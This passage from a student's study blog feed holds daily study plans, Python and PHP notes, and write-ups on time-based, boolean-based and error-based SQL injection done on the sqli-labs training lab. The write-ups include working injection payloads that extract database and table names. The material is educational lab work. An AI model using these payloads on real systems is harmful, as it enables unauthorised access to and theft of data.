<td>8：00-9：00</td>
<td>英语听力，朗读，背单词</td>
</tr>
<tr>
<td>9：30-10：30</td>
<td>XSS(reflected)【太阳好的话看会书】</td>
</tr>
<tr>
<td>11:00-12:00</td>
<td>c语言菜单程序</td>
</tr>
<tr>
<td>14：00-15：00</td>
<td>brute force的high级别</td>
</tr>
<tr>
<td>15：30-17：00</td>
<td>buu和bugku刷刷题</td>
</tr>
<tr>
<td>19：00-20：00</td>
<td>预习高数</td>
</tr>
<tr>
<td>20：30-21：30</td>
<td>sqli-labs 11-12【心情好的话看看书】</td>
</tr>
<tr>
<td>21：45-22：30</td>
<td>总结下未完成的东西【搞完了就dvwa往后做】</td>
</tr>
<tr>
<td></td>
<td>上床</td>
</tr>
</tbody></table>
<h2 id="2020-02-19总结"><a href="#2020-02-19总结" class="headerlink" title="2020-02-19总结"></a>2020-02-19总结</h2><ol>
<li>做了dvwa的CSRF，做到high级时要用到关于XSS的知识</li>
<li>做了XSS（DOM）所有级别</li>
<li>想完成c语言做菜单的程序，但是遇到了一个问题：</li>
</ol>
<p>如何在一个c程序里运行另一个c程序，用system的话只能打开未编译的文本文件，于是明天想想</p>
<ol>
<li>看能不能把要用的c文件先编译一下</li>
<li>或者看看运用头文件引用是否可行</li>
<li>尝试一下bat文件？</li>
</ol>
<p>哦对，还和forest官方发了邮件，希望能找回以前的帐号</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-17日目标</title>
    <url>/2020/02/16/2020-02-17%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-17日目标"><a href="#2020-02-17日目标" class="headerlink" title="2020-02-17日目标"></a>2020-02-17日目标</h2><table>
<thead>
<tr>
<th>起床</th>
<th>9：00</th>
</tr>
</thead>
<tbody><tr>
<td>项目（外星人入侵地球）</td>
<td>10：00-12：00</td>
</tr>
<tr>
<td>dvwa：CSRF</td>
<td>15：00-16：30</td>
</tr>
<tr>
<td>看看书，数学通识</td>
<td>16：30-dinner</td>
</tr>
<tr>
<td>项目（外星人入侵地球）</td>
<td>19：30-21：30</td>
</tr>
<tr>
<td>上床</td>
<td>0：00</td>
</tr>
</tbody></table>
<h2 id="2020-02-16总结"><a href="#2020-02-16总结" class="headerlink" title="2020-02-16总结"></a>2020-02-16总结</h2><p>早上起床听了会六级听力。接着把python的书看完了，明天准备试着跟着步骤开始一个项目。然后就是把dvwa的command injection做好了。缺点的话就是数学通识没听，书也没看。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>php stristr函数[搜索字符串]</title>
    <url>/2020/02/16/php-stristr%E5%87%BD%E6%95%B0-%E6%90%9C%E7%B4%A2%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h3 id="stristr-string-search-before-search-："><a href="#stristr-string-search-before-search-：" class="headerlink" title="stristr(string,search,before_search) ："></a>stristr(string,search,before_search) ：</h3><p>搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE</p>
<p>string    必需。规定被搜索的字符串<br>search    必需。规定要搜索的字符串，如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符<br>before_search    可选。默认值为 “false” 的布尔值<br>如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分</p>
<p>注释：该函数是二进制安全的<br>注释：该函数是不区分大小写的，如需进行<strong>区分大小写</strong>的搜索，请使用 <strong>strstr()</strong> 函数</p>
]]></content>
      <categories>
        <category>php 函数整理</category>
      </categories>
      <tags>
        <tag>函数</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-16日目标</title>
    <url>/2020/02/15/2020-02-16%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-16日目标"><a href="#2020-02-16日目标" class="headerlink" title="2020-02-16日目标"></a>2020-02-16日目标</h2><table>
<thead>
<tr>
<th>起床</th>
<th>9：00</th>
</tr>
</thead>
<tbody><tr>
<td>python</td>
<td>10：00-12：00</td>
</tr>
<tr>
<td>dvwa</td>
<td>15：00-16：30</td>
</tr>
<tr>
<td>看看书，数学通识</td>
<td>16：30-dinner</td>
</tr>
<tr>
<td>python</td>
<td>19：30-21：30</td>
</tr>
<tr>
<td>上床</td>
<td>0：00</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-14日目标</title>
    <url>/2020/02/13/2020-02-14%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-14日目标"><a href="#2020-02-14日目标" class="headerlink" title="2020-02-14日目标"></a>2020-02-14日目标</h2><table>
<thead>
<tr>
<th>9：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>10：00-12：00</td>
<td>python</td>
</tr>
<tr>
<td>12：00-lunchtime</td>
<td>看看书，数学通识</td>
</tr>
<tr>
<td>15：30-17：00</td>
<td>DVWA</td>
</tr>
<tr>
<td>19：30-21：30</td>
<td>python</td>
</tr>
<tr>
<td>00：30</td>
<td>睡觉</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-13日目标</title>
    <url>/2020/02/12/2020-02-13%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-13日目标"><a href="#2020-02-13日目标" class="headerlink" title="2020-02-13日目标"></a>2020-02-13日目标</h2><table>
<thead>
<tr>
<th>起床</th>
<th>9:00</th>
</tr>
</thead>
<tbody><tr>
<td>python</td>
<td>10:00-12:00</td>
</tr>
<tr>
<td>看看书，数学通识</td>
<td>—lunchtime</td>
</tr>
<tr>
<td>sqli-labs 9-10</td>
<td>15：00-16：00</td>
</tr>
<tr>
<td>php</td>
<td>16：30-17：30</td>
</tr>
<tr>
<td>python</td>
<td>19：30-21：30</td>
</tr>
<tr>
<td>睡觉</td>
<td>12：30</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>python代码规范</title>
    <url>/2020/02/12/python%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<ol>
<li><p>缩进用4个空格</p>
</li>
<li><p>行长不超过80字符</p>
</li>
<li><p>合理安排空行</p>
</li>
<li><p>在诸如== 、&gt;= 和&lt;= 等比较运算符两边各添加一个空格</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if age &gt; 4:    &#x2F;&#x2F;TRUE</span><br><span class="line">if age&lt;4:      &#x2F;&#x2F;FALSE</span><br></pre></td></tr></table></figure>
</li>
<li><p>对于较长的print语句，可以将语句的第一部分跟在print右边，其余换行。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;Sarah&#39;s favorite language is &quot; + </span><br><span class="line">    favorite_languages[&#39;sarah&#39;].title() + </span><br><span class="line">    &quot;.&quot;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>千万千万注意要习惯用四个空格而不用tab！！！</p>
</li>
<li><p>在类中，可使用一个空行来分隔<strong>方法</strong>；而在模块中，可使用两个空行来分隔<strong>类</strong>。</p>
</li>
<li><p>需要同时导入标准库中的模块和你编写的模块时，先编写导入标准库模块的import 语句，再添加一个空行，然后编写导入你自己编写的模块的import 语句。在包含多 条import 语句的程序中，这种做法让人更容易明白程序使用的各个模块都来自何方。 </p>
</li>
<li><p><strong>类名应采用驼峰命名法</strong> ，即将类名中的每个单词的首字母都大写，而不使用下划线。<strong>实例名和模块名都采用小写格式，并在单词之间加上下划线。</strong></p>
</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>代码规范</tag>
      </tags>
  </entry>
  <entry>
    <title>python2与python3的一些区别</title>
    <url>/2020/02/12/python2%E4%B8%8Epython3%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8C%BA%E5%88%AB/</url>
    <content><![CDATA[<h3 id="print语句"><a href="#print语句" class="headerlink" title="print语句"></a>print语句</h3><ol>
<li>python2中print语句有些包含括号，有些不含。</li>
<li>python3中print是一个函数，因此括号必不可少。</li>
</ol>
<h3 id="input"><a href="#input" class="headerlink" title="input()"></a>input()</h3><ol>
<li>python3中获取用户输入是input()</li>
<li>python2.7里则是raw_input(),在此版本中input()将用户输入解读为代码。</li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python注意事项</title>
    <url>/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    <content><![CDATA[<ol>
<li><p>如要在字符串中使用引号，则包裹字符串要用双引号，单引号不可。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;George&#39;s personality is very optimistic!&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>变量打印时如要换行要用加号，与c语言有差别。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(name + &quot;\n\t&quot;)   &#x2F;&#x2F;python</span><br><span class="line">printf(&quot;&amp;d\n\t&quot;,name)    &#x2F;&#x2F;C语言</span><br></pre></td></tr></table></figure>
</li>
<li><p>str()函数将非字符串转为字符串以正常打印。如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">age &#x3D; 23 </span><br><span class="line">message &#x3D; &quot;Happy &quot; + str(age) + &quot;rd Birthday!&quot; </span><br><span class="line">print(message)</span><br></pre></td></tr></table></figure>
</li>
<li><p>列表中name[-1]可访问最后一个元素。</p>
</li>
<li><p>变量，列表值都不要加双引号，加了引号代表字符串，直接字面打印其中内容。</p>
</li>
<li><p>在对列表进行增删时一定要注意一个顺序性，即你如果删除了name[0]，原来的name[1]就变成了name[0]。</p>
</li>
<li><p>字典里哪怕嵌套的是字典，第一个字典内都要用冒号，而非等号；而且每一个键-值后记得加逗号！<img src="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/1.png" alt="1"></p>
</li>
<li><p>遍历字典的键-值时，一定要记得加.item()</p>
</li>
<li><p>如果想引用特定函数（from。。。import。。。），要在不想引用部分加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br></pre></td></tr></table></figure>
</li>
<li><pre><code>import xxx</code></pre><p>时，在引用类的时候记得要用   xxx.方法/属性！</p>
<p><img src="/2020/02/12/python%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/2.png" alt="2"></p>
</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python的一些简单方法</title>
    <url>/2020/02/12/python%E7%9A%84%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h3 id="去除空白"><a href="#去除空白" class="headerlink" title="去除空白"></a>去除空白</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rstrip()   &#x2F;&#x2F;去除尾部空白</span><br><span class="line">lstrip()   &#x2F;&#x2F;去除头部空白</span><br><span class="line">strip()    &#x2F;&#x2F;去除头尾空白</span><br></pre></td></tr></table></figure>



<h3 id="大小写"><a href="#大小写" class="headerlink" title="大小写"></a>大小写</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name.title()   &#x2F;&#x2F;首字母大写</span><br><span class="line">name.upper()   &#x2F;&#x2F;全部大写</span><br><span class="line">name.lower()   &#x2F;&#x2F;全部小写</span><br></pre></td></tr></table></figure>



<h3 id="对列表的插入与删除"><a href="#对列表的插入与删除" class="headerlink" title="对列表的插入与删除"></a>对列表的插入与删除</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name.append(&#39;a&#39;)   &#x2F;&#x2F;在列表末尾添加元素a</span><br><span class="line">name.insert(0,&#39;a&#39;) &#x2F;&#x2F;在列表0位置添加元素a</span><br><span class="line">del name[0]        &#x2F;&#x2F;删除列表0位置元素</span><br></pre></td></tr></table></figure>

<h4 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;]  </span><br><span class="line">print(motorcycles) </span><br><span class="line"></span><br><span class="line">popped_motorcycle &#x3D; motorcycles.pop()</span><br><span class="line">print(motorcycles) </span><br><span class="line">print(popped_motorcycle)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;] </span><br><span class="line">suzuki</span><br></pre></td></tr></table></figure>

<p>pop中添加数字即可添加元素到任何位置</p>
<h4 id="根据值删除元素"><a href="#根据值删除元素" class="headerlink" title="根据值删除元素"></a>根据值删除元素</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">motorcycles &#x3D; [&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;]  print(motorcycles) </span><br><span class="line">too_expensive &#x3D; &#39;ducati&#39; </span><br><span class="line"></span><br><span class="line">motorcycles.remove(too_expensive)  </span><br><span class="line">print(motorcycles) </span><br><span class="line">print(&quot;\nA &quot; + too_expensive.title() + &quot; is too expensive for me.&quot;)</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;, &#39;ducati&#39;] </span><br><span class="line">[&#39;honda&#39;, &#39;yamaha&#39;, &#39;suzuki&#39;] </span><br><span class="line">A Ducati is too expensive for me.</span><br></pre></td></tr></table></figure>



<h3 id="组织列表"><a href="#组织列表" class="headerlink" title="组织列表"></a>组织列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">list.sort()   &#x2F;&#x2F;对列表进行永久性排序（a-z）</span><br><span class="line">list.sort(reverse&#x3D;true)   &#x2F;&#x2F;对列表进行永久性倒叙排序（z-a）</span><br><span class="line">sorted(list)   &#x2F;&#x2F;对列表进行临时性排序</span><br><span class="line"></span><br><span class="line">list.reverse()   &#x2F;&#x2F;倒着打印列表(这玩意有点奇妙，你不能把它放print里面，像print(list.reverse())</span><br><span class="line"></span><br><span class="line">len(list)   &#x2F;&#x2F;获取列表的长度(记得打印)</span><br></pre></td></tr></table></figure>



<h3 id="遍历列表"><a href="#遍历列表" class="headerlink" title="遍历列表"></a>遍历列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">range(start_num,finish_num,step)</span><br><span class="line">list()   &#x2F;&#x2F;将括号内转化为列表</span><br></pre></td></tr></table></figure>



<h3 id="处理一堆数字的列表"><a href="#处理一堆数字的列表" class="headerlink" title="处理一堆数字的列表"></a>处理一堆数字的列表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">min()   &#x2F;&#x2F;最大值</span><br><span class="line">max()   &#x2F;&#x2F;最小值</span><br><span class="line">sum()   &#x2F;&#x2F;总和</span><br></pre></td></tr></table></figure>



<h3 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set()    &#x2F;&#x2F;去除其中重复值</span><br></pre></td></tr></table></figure>



<h3 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name.split()    &#x2F;&#x2F;以空格为界限，把字符串分割成若干块并放入列表</span><br></pre></td></tr></table></figure>



<h3 id="判断字符类型"><a href="#判断字符类型" class="headerlink" title="判断字符类型"></a>判断字符类型</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isinstance(string,type)    &#x2F;&#x2F;判断string是否是type类型，返回布尔值</span><br><span class="line">isdigit(string)            &#x2F;&#x2F;判断字符串是否为数字</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>2020-02-12日目标</title>
    <url>/2020/02/12/2020-02-12%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-12"><a href="#2020-02-12" class="headerlink" title="2020-02-12"></a>2020-02-12</h2><table>
<thead>
<tr>
<th>10：00</th>
<th>起床</th>
</tr>
</thead>
<tbody><tr>
<td>10：30-12：00</td>
<td>python</td>
</tr>
<tr>
<td>12：00-lunchtime</td>
<td>数学通识+看看书</td>
</tr>
<tr>
<td>15：00-16：00</td>
<td>sql-labs 9-10</td>
</tr>
<tr>
<td>18：30-20：30</td>
<td>python</td>
</tr>
<tr>
<td></td>
<td>php</td>
</tr>
<tr>
<td></td>
<td>上床</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>sql时间型注入</title>
    <url>/2020/02/11/sql%E6%97%B6%E9%97%B4%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>今天遇到了sql时间型注入，大致总结一下，其实和布尔型注入非常相似，只不过利用了sleep（）函数对网页延迟的影响来判断正误。</p>
<p>比如判断是否存在漏洞时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and sleep(5)--+</span><br></pre></td></tr></table></figure>

<p>判断数据库长度时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and if(length(database())&#x3D;8,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

<p>判断数据库字母时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39;and if(ascii(substr((select database()),1,1))&gt;113,1,sleep(5))--+</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-11日目标</title>
    <url>/2020/02/11/2020-02-11%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-11日目标"><a href="#2020-02-11日目标" class="headerlink" title="2020-02-11日目标"></a>2020-02-11日目标</h2><ol>
<li>sqli-labs往后做</li>
<li>python的书看起来</li>
<li>数学通识2-3</li>
<li>单词20个</li>
<li>听力10min</li>
</ol>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>sql布尔型注入</title>
    <url>/2020/02/10/sql%E5%B8%83%E5%B0%94%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>做到了sqli-labs的第六题，其实对比第五题只要改成了“即可，但是网上介绍了一种新的方法叫布尔型注入，这种方法emmm有点麻烦不太方便，但是容易理解，也多了解一条路子嘛。</p>
<p>总结一下来说，布尔型注入就是构造条件句，然后通过页面是否返回内容来判断构造条件是否满足。</p>
<p>比如一开始爆库名时</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and substr(database(),1,1)&gt;&#39;a&#39;</span><br></pre></td></tr></table></figure>

<p>利用不停改变a确定数据库第一个字母的值（可用二分法），接着爆出数据库名的长度，例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and length(database())&#x3D;&#39;8&#39;</span><br></pre></td></tr></table></figure>

<p>然后一个字母一个字母爆出整个库名</p>
<p>接着爆出表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,1)&#x3D;&#39;u&#39;</span><br></pre></td></tr></table></figure>

<p>limit 3,1 代表数据库里第4张表（第一张表是0）</p>
<p>如果大致能确定出表名，可这样确认猜测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&quot; and substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1),1,5)&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>



<p>接下来的原理类似就不赘述。总之这种办法比较累人，不到万不得已建议还是用报错型注入。</p>
]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-10日目标</title>
    <url>/2020/02/09/2020-02-10%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-10日目标"><a href="#2020-02-10日目标" class="headerlink" title="2020-02-10日目标"></a>2020-02-10日目标</h2><ol>
<li>英语听力10min</li>
<li>单词20个</li>
<li>数学通识2-3</li>
<li>sqli-labs继续刷</li>
<li>刷道wechall</li>
<li>开始接触python</li>
</ol>
<h2 id="2020-02-09总结"><a href="#2020-02-09总结" class="headerlink" title="2020-02-09总结"></a>2020-02-09总结</h2><p>讲真，今天一天，都在忙sqli-labs的less5，从一开始看答案的一脸懵逼，到后来一步步拆解分析，再到晚上甚至对答案提出了质疑，之后再深入思考又发现我质疑的点有不严密的地方，但是其中有一个点完全是答案可以改善的，也在原作者博客下评论了，希望那位大佬能注意到。总之，很奇妙的感觉，就像是思维的一场碰撞，不仅限于我和别人，也可以是现在的自己和以前的自己。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>sql报错型注入</title>
    <url>/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h2 id="对于原作者代码地理解"><a href="#对于原作者代码地理解" class="headerlink" title="对于原作者代码地理解"></a>对于原作者代码地理解</h2><p>今天做了sqli-labs的less5，第一次遇到这种报错型注入，就想好好研究下。</p>
<p>先来看这一段代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x) as a)--+</span><br></pre></td></tr></table></figure>

<p>第一眼看到的时候就懵了，然后想慢慢拆解下来看。我先把它放到word里，然后把每个括号都标上不同的序号和颜色：</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/1.png" alt="1"></p>
<p>然后一段段看：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. (select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1)</span><br></pre></td></tr></table></figure>

<p>这一段代表从表information_schema.schemata中提取schema_name字段的第一个记录数并在其后加上分号”;”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2. floor(rand()*2)</span><br></pre></td></tr></table></figure>

<p>rand()代表在0-1之间取随机数，而rand()*2则表示在0-2之间取随机数，floor代表取整，合在一起就代表在随机取0或1.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">3. concat(1., 2.) as x</span><br></pre></td></tr></table></figure>

<p>代表将1.与2.连接并填写入一个新的字段x中。例如test0与test1填写到x字段中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4. (select count(*),3. from information_schema.tables group by x)</span><br></pre></td></tr></table></figure>

<p>3.中的字符已确定，此串代码的意思是统计出information_schema.tables表中的行数，并给每一行的数据随机分配一个“名字”（test0，test1）。</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/2.png" alt="2"></p>
<p><strong>注：重点来了重点来了！</strong></p>
<p>如果仅仅是这样，你可能会问，这不很正常嘛，哪里有错误回显？</p>
<p>别急，如果我把这段代码原封不动再打一遍，可能会出现如下情况：</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/3.png" alt="3"></p>
<p>仔细观察发现两次输入完全一样，但为什么会报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Duplicate entry &#39;information_schema0&#39; for key &#39;group_key&#39;</span><br></pre></td></tr></table></figure>

<p>这个要理解透彻对我有些难度，需要理解数据库一些语句的运行机制。</p>
<p>在网上搜到了一篇不错的理解：<a href="https://blog.csdn.net/he_and/article/details/80455884" target="_blank" rel="noopener">点我</a></p>
<p>我大概转述一下他的意思：</p>
<p>我们先假设floor(rand()*2)函数连续五次的取值为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0，1，1，0，1</span><br></pre></td></tr></table></figure>

<p>刚开始的时候虚拟表是空的</p>
<table>
<thead>
<tr>
<th>count（*）</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>扫描原始表第一项时，第一次计算取到了information_schema0，到x里寻找显然没有，于是要将它插入表中。</p>
<p><strong>但要记住！在插入之前会进行第二次计算</strong>，这时x的值就变成了information_schema1，于是乎表就变成了</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>information_schema1</td>
</tr>
</tbody></table>
<p>扫描原始表第二项时，得到information_schema1，到x里寻找能找到，于是乎表变成了</p>
<table>
<thead>
<tr>
<th>count(*)</th>
<th>x</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>information_schema1</td>
</tr>
</tbody></table>
<p>接着扫描原始表第三项，计算得到information_schema0，到x里寻找显然没有，于是要将它插入表中，进行第二次计算得到information_schema1。</p>
<p>这时数据表就一脸懵逼，不是有了information_schema1嘛，于是它就报错。也就通过错误回显得到了我们想要的信息。</p>
<blockquote>
<p>还要注意一点，如果想要稳定地报错，可以使用rand（0）.</p>
</blockquote>
<p>到这里有人可能还会疑惑，这不就已经能错误回显了吗，为什么前面还会有select1</p>
<p>我们再仔细看这个代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+</span><br></pre></td></tr></table></figure>

<p>id=2‘ 和后面连接用的是and，如果没有select1，会发现两部分没有交集，无法成立，也就看不到回显了。</p>
<h2 id="对原作者码地质疑"><a href="#对原作者码地质疑" class="headerlink" title="对原作者码地质疑"></a>对原作者码地质疑</h2><p>按照原作者的意思这段码用<code>limit0，1</code>改变第一个数字的值而不断爆出数据库名</p>
<p>他给出了以下解释</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/4.png" alt="4"></p>
<p>其实我不了解group_concat()函数最大的字节数什么的，但经过测试我发现问题在于rand()应该改为rand(0)。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select group_concat(schema_name) from information_schema.schemata),floor (rand(0)*2)) as x from information_schema.tables group by x) as a) --+</span><br></pre></td></tr></table></figure>

<p>这段代码完全可以爆出所有的库名</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/5.png" alt="5"></p>
<p>至于不加0为什么会得到</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/6.png" alt="6"></p>
<p>因为and后的语句查询结果为</p>
<p><img src="/2020/02/09/sql%E6%8A%A5%E9%94%99%E5%9E%8B%E6%B3%A8%E5%85%A5/7.png" alt="7"></p>
<p>而and前只有一行，后面的语句超过了一行所以报错。</p>
<h3 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h3><p>再仔细一想，是我的问题，因为虽然可以爆出部分库名，但因为字节的限制不能显示所有库名，但rand（0）的改进没有任何问题！</p>
<p>所有最后代码就变成了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;2&#39; and (select 1 from (select count(*),concat((select concat(schema_name,&#39;;&#39;) from information_schema.schemata limit 0,1),floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>sql</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>2020-02-08日目标</title>
    <url>/2020/02/07/2020-02-08%E6%97%A5%E7%9B%AE%E6%A0%87/</url>
    <content><![CDATA[<h2 id="2020-02-08日目标"><a href="#2020-02-08日目标" class="headerlink" title="2020-02-08日目标"></a>2020-02-08日目标</h2><ol>
<li>英语听力10min</li>
<li>数学通识2-3篇</li>
<li>英语单词20个</li>
<li>sqli-labs往后刷题</li>
<li>http协议最后一章带着看</li>
<li>如果有时间可以开始肝python了</li>
</ol>
<h2 id="2020-02-07总结"><a href="#2020-02-07总结" class="headerlink" title="2020-02-07总结"></a>2020-02-07总结</h2><p>今天先学完了AJAX，之后上wechall刷了两道题，通过regex那题又温习了一遍正则表达式，明天要早起了不能这么浑浑噩噩了！哦对，还看了本书《呼啸山庄》，讲真，最后结尾有点没看懂。</p>
]]></content>
      <categories>
        <category>日目标</category>
      </categories>
  </entry>
  <entry>
    <title>AJAX基础</title>
    <url>/2020/02/07/AJAX%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>AJAX = 异步 JavaScript 和 XML。</p>
<p>AJAX 是一种用于创建快速动态网页的技术。</p>
